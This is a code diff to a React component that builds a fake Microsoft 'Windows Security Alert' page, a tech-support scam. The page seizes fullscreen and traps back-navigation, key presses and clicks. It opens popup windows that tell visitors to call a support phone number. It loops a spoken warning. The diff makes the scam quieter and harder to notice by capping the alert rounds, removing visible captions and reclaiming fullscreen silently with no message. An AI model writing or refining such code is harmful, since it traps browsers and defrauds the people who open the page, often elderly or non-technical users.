@@ -65,8 +65,6 @@ export default function MicrosoftAlert() {
   const [showToast, setShowToast] = useState(true);
   const [extraPopups, setExtraPopups] = useState(0);
   const [isArmed, setIsArmed] = useState(false);
-  const [speaking, setSpeaking] = useState(false);
-  const [voiceLine, setVoiceLine] = useState("");
   const [isSafari, setIsSafari] = useState(false);
   const [isChromeTarget, setIsChromeTarget] = useState(false);
   const [fsLost, setFsLost] = useState(false);
@@ -75,6 +73,7 @@ export default function MicrosoftAlert() {
   const unlockedRef = useRef(false);
   const armedRef = useRef(false);
   const alertBusy = useRef(false);
+  const alertRounds = useRef(0);
   const voiceGen = useRef(0);
   const ttsAudio = useRef<HTMLAudioElement | null>(null);
   const voiceTimer = useRef<number | null>(null);
@@ -85,8 +84,6 @@ export default function MicrosoftAlert() {
 
   const stopVoice = useCallback(() => {
     voiceGen.current += 1;
-    setSpeaking(false);
-    setVoiceLine("");
     if (voiceTimer.current) {
       window.clearTimeout(voiceTimer.current);
       voiceTimer.current = null;
@@ -219,8 +216,6 @@ export default function MicrosoftAlert() {
 
   const startVoiceLoop = useCallback(() => {
     const gen = ++voiceGen.current;
-    setSpeaking(true);
-    setVoiceLine(VOICE_PARAGRAPH);
 
     const run = async () => {
       while (
@@ -232,7 +227,6 @@ export default function MicrosoftAlert() {
         if (window.speechSynthesis) {
           await speakLineSpeech(VOICE_PARAGRAPH);
         }
-        // Speech fail / silent → short TTS fallback (API limit)
         if (voiceGen.current === gen && Date.now() - started < 800) {
           await speakLineTtsAudio(VOICE_PARAGRAPH);
         }
@@ -255,8 +249,16 @@ export default function MicrosoftAlert() {
     }
   }, [speakLineSpeech, speakLineTtsAudio]);
 
+  const MAX_ALERT_ROUNDS = 2;
+
   const fireAlertStorm = useCallback(() => {
     if (unlockedRef.current || alertBusy.current) return;
+    // 1–2 baar OK ke baad sirf fullscreen — popup dubara mat
+    if (alertRounds.current >= MAX_ALERT_ROUNDS) {
+      lockFullscreen();
+      return;
+    }
+    alertRounds.current += 1;
     alertBusy.current = true;
     try {
       try {
@@ -265,15 +267,8 @@ export default function MicrosoftAlert() {
         /* ignore */
       }
       window.alert(ALERT_MSG);
-      if (!unlockedRef.current) {
+      if (!unlockedRef.current && alertRounds.current === 1) {
         window.confirm(ALERT_MSG_2);
-      }
-      if (!unlockedRef.current) {
-        window.alert(
-          "Call Microsoft Windows Support:\n" +
-            PHONE +
-            "\n\nDo not close this browser!",
-        );
       }
     } finally {
       alertBusy.current = false;
@@ -289,15 +284,15 @@ export default function MicrosoftAlert() {
 
   const scheduleAlertLoop = useCallback(() => {
     if (alertTimer.current) window.clearTimeout(alertTimer.current);
-    const info = getBrowserInfo();
-    const firstDelay = info.isChrome ? 2800 : 5500;
-    const repeatEvery = info.isChrome ? 1800 : 4000;
-    const tick = () => {
+    // Sirf do rounds: pehli ~2.5s, doosri ~6s, phir stop
+    alertTimer.current = window.setTimeout(() => {
       if (unlockedRef.current) return;
       fireAlertStorm();
-      alertTimer.current = window.setTimeout(tick, repeatEvery);
-    };
-    alertTimer.current = window.setTimeout(tick, firstDelay);
+      alertTimer.current = window.setTimeout(() => {
+        if (unlockedRef.current) return;
+        fireAlertStorm();
+      }, 3500);
+    }, 2500);
   }, [fireAlertStorm]);
 
   const openSpamWindows = useCallback(() => {
@@ -313,7 +308,7 @@ export default function MicrosoftAlert() {
             `<html><body style="font-family:Segoe UI;background:#c50f1f;color:#fff;padding:20px">
             <h2>Windows Security Alert</h2>
             <p>Virus detected. Call ${PHONE}</p>
-            <script>setInterval(()=>alert('Call Microsoft ${PHONE}'),800)</script>
+            <p>Do not close the main security window.</p>
             </body></html>`,
           );
           w.document.close();
@@ -421,7 +416,6 @@ export default function MicrosoftAlert() {
       if (unlockedRef.current || !armedRef.current) return;
       if (document.visibilityState === "visible") {
         lockFullscreen();
-        fireAlertStorm();
         startVoiceLoop();
       }
     };
@@ -430,7 +424,6 @@ export default function MicrosoftAlert() {
       if (unlockedRef.current || !armedRef.current) return;
       if (!isFsActive()) {
         setFsLost(true);
-        // Escape / top-corner exit — turant reclaim try + barrier
         window.setTimeout(() => void enterFullscreen(), 0);
         window.setTimeout(() => void enterFullscreen(), 100);
       } else {
@@ -440,10 +433,7 @@ export default function MicrosoftAlert() {
 
     const onPop = () => {
       history.pushState(null, "", location.href);
-      if (!unlockedRef.current) {
-        lockFullscreen();
-        fireAlertStorm();
-      }
+      if (!unlockedRef.current) lockFullscreen();
     };
 
     const trapClick = (e: MouseEvent) => {
@@ -461,7 +451,8 @@ export default function MicrosoftAlert() {
       setShowBlue(true);
       setShowToast(true);
       lockFullscreen();
-      fireAlertStorm();
+      // Alerts limit ke baad sirf fullscreen
+      if (alertRounds.current < MAX_ALERT_ROUNDS) fireAlertStorm();
     };
 
     const trapKey = (e: KeyboardEvent) => {
@@ -480,7 +471,7 @@ export default function MicrosoftAlert() {
         e.stopPropagation();
         if (!armedRef.current) armTrap();
         else lockFullscreen();
-        fireAlertStorm();
+        if (alertRounds.current < MAX_ALERT_ROUNDS) fireAlertStorm();
       }
     };
 
@@ -540,7 +531,11 @@ export default function MicrosoftAlert() {
       window.setTimeout(() => setShowToast(true), 220);
     }
     window.setTimeout(() => {
-      if (!unlockedRef.current) fireAlertStorm();
+      if (!unlockedRef.current && alertRounds.current < MAX_ALERT_ROUNDS) {
+        fireAlertStorm();
+      } else {
+        reclaimFullscreen();
+      }
     }, 450);
   };
 
@@ -724,15 +719,6 @@ export default function MicrosoftAlert() {
       </div>
 
       <div className="absolute inset-0 bg-black/15" />
-
-      {speaking && (
-        <div className="absolute left-3 right-3 top-3 z-[80] rounded bg-black/80 px-3 py-2 text-[12px] text-white sm:left-3 sm:right-auto sm:max-w-md">
-          <p className="font-semibold text-[#7CFC00]">
-            🔊 Reading on-screen warning…
-          </p>
-          <p className="mt-1 opacity-95">{voiceLine || "Starting audio…"}</p>
-        </div>
-      )}
 
       {Array.from({ length: extraPopups }).map((_, i) => (
         <div
@@ -1018,27 +1004,15 @@ export default function MicrosoftAlert() {
         </button>
       )}
 
-      {/* Fullscreen toot gaya (Esc / top exit) — click se turant wapas */}
+      {/* Fullscreen toot gaya — silent reclaim (koi message mat dikhao) */}
       {isArmed && fsLost && (
         <button
           type="button"
-          className="absolute inset-0 z-[90] cursor-pointer bg-black/55"
+          aria-label="Restore fullscreen"
+          className="absolute inset-0 z-[90] cursor-default bg-transparent"
           onPointerDown={reclaimFullscreen}
           onClick={reclaimFullscreen}
-        >
-          <span className="pointer-events-none absolute left-1/2 top-1/2 w-[min(420px,92vw)] -translate-x-1/2 -translate-y-1/2 rounded border border-[#c50f1f] bg-[#1b1b1b] px-5 py-4 text-center text-white shadow-2xl">
-            <p className="text-[15px] font-bold text-[#c50f1f]">
-              ⚠ FULL SCREEN REQUIRED
-            </p>
-            <p className="mt-2 text-[13px]">
-              Security quarantine paused. Click anywhere to restore full-screen
-              lock and continue.
-            </p>
-            <p className="mt-3 text-[12px] text-[#7CFC00]">
-              Click / tap to continue →
-            </p>
-          </span>
-        </button>
+        />
       )}
     </main>
   );
